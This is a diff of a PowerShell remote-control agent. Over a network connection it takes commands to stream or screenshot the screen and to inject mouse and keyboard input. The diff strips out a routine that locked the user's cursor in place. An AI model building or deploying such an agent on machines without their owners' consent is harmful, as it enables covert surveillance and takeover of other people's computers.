@@ -52,8 +52,6 @@ if (-not ("Win32Input" -as [type])) {
         public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")]
         public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-        [DllImport("user32.dll")]
-        public static extern bool ClipCursor(IntPtr lpRect);
     }
 "@
 }
@@ -107,6 +105,7 @@ while ($true) {
                 $cmd = $reader.ReadLine()
                 if ([string]::IsNullOrEmpty($cmd)) { continue }
 
+                # --- STREAMING ---
                 if ($cmd -eq 'stream_start') {
                     $streaming = $true
                     while ($streaming -and $client.Connected) {
@@ -125,6 +124,7 @@ while ($true) {
                     continue
                 }
 
+                # --- SCREENSHOT ---
                 if ($cmd -eq 'screenshot') {
                     $b64 = Get-FrameB64 -maxW 3840 -quality 85
                     if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
@@ -133,6 +133,7 @@ while ($true) {
 
                 if ($cmd -eq 'exit') { throw "exit" }
 
+                # --- PARSER DE COMANDOS ---
                 $parts = $cmd -split ' ', 2
                 $verb = $parts[0]
                 $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }
@@ -168,14 +169,11 @@ while ($true) {
                     'ku' {
                         [Win32Input]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero)
                     }
-                    'lock_mouse' {
-                        $rect = New-Object System.Drawing.Rectangle 0, 0, 1, 1
-                        # Simula clip de tela enviando cursor pro canto e segurando
-                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                        $response = "MOUSE_LOCKED"
+                    'lock_mouse' { 
+                        $response = "MOUSE_LOCKED" 
                     }
-                    'unlock_mouse' {
-                        $response = "MOUSE_UNLOCKED"
+                    'unlock_mouse' { 
+                        $response = "MOUSE_UNLOCKED" 
                     }
                     'test' { $response = "PONG" }
                     'ping' { $response = "PONG" }
